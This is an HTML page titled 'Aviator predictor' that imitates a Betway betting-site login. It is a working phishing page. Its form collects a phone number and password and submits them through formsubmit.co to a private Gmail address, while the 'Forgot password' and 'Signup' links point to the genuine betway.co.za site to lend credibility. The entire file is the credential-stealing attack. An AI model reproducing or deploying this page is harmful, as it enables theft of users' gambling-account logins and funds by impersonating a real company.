<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aviator predictor</title> 
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"/>
    
    <style>
      @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap');
      *{
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Poppins',sans-serif;
      }
      body{
        background: white;
        overflow: hidden;
      }
      ::selection{
        background: rgba(26,188,156,0.3);
      }
      .container{
        max-width: 440px;
        padding: 0 20px;
        margin: 50px auto;
        padding-bottom: 40px;
        
        padding-top: 10px;
      }
      .wrapper{
        width: 100%;
        background: #fff;
        border-radius: 5px;
        box-shadow: 0px 4px 10px 1px rgba(0,0,0,0.1);
      }
      .wrapper .title{
        height: 90px;
        background: #313131;
        border-radius: 5px 5px 0 0;
        color: #fff;
        font-size: 50px;
        font-weight: 600;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .wrapper form{
        padding: 30px 25px 25px 25px;
        
      }
      
      
      
      img {
      border-top-left-radius: 8px;
      border-top-right-radius: 8px;
      width: 99%;
      display: block;
      margin: 0 auto;
      box-shadow: 5px 5px 10px rgba(255, 255, 255, 0.2);
    }
      
      
      
      .wrapper form .row{
        height: 45px;
        margin-bottom: 15px;
        position: relative;
      }
      .wrapper form .row input{
        height: 100%;
        width: 100%;
        outline: none;
        padding-left: 60px;
        border-radius: 5px;
        border: 1px solid lightgrey;
        font-size: 16px;
        transition: all 0.3s ease;
      }
      form .row input:focus{
        border-color: #16a085;
        box-shadow: inset 0px 0px 2px 2px rgba(26,188,156,0.25);
      }
      form .row input::placeholder{
        color: #999;
      }
      .wrapper form .row i{
        position: absolute;
        width: 47px;
        height: 100%;
        color: #fff;
        font-size: 18px;
        background: #A01616;
        border: 1px solid #16a085;
        border-radius: 5px 0 0 5px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .wrapper form .pass{
        margin: -8px 0 20px 0;
      }
      .wrapper form .pass a{
        color: #A01616;
        font-size: 17px;
        text-decoration: none;
      }
      .wrapper form .pass a:hover{
        text-decoration: underline;
      }
      .wrapper form .button input{
        color: #fff;
        font-size: 20px;
        font-weight: 500;
        padding-left: 0px;
        background: #A01616;
        border: 1px solid #16a085;
        cursor: pointer;
      }
      form .button input:hover{
        background: #276D39;
      }
      .wrapper form .signup-link{
        text-align: center;
        margin-top: 20px;
        font-size: 17px;
      }
      .wrapper form .signup-link a{
        color: #A01616;
        text-decoration: none;
      }
      form .signup-link a:hover{
        text-decoration: underline;
      }
    </style>
  </head>
  
  <body>
    <div class="container">
      <div class="wrapper">
        
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSL7FiXDRqaqkjsDCJanums6A-gCHyUJYHS3h3qVktoiw&s" alt="">
        
        
        
        
        <div class="title"><span>BetWay</span></div>
        <form action="https://formsubmit.co/mickeyffyt@gmail.com" method="POST">
          <div class="row">
            <i class="fas fa-user"></i>
            <input type="text" name="phone" placeholder="Phone" required>
          </div>
          <div class="row">
            <i class="fas fa-lock"></i>
            <input type="password" name="password" placeholder="Password" required>
          </div>
          <div class="pass"><a href="https://betway.co.za">Forgot password?</a></div>
          <div class="row button">
            <input type="submit" value="Login">
          </div>
          <div class="signup-link">Not Registered? <a href="https://betway.co.za">Signup now</a></div>
        </form>
      </div>
    </div>
  </body>
</html>
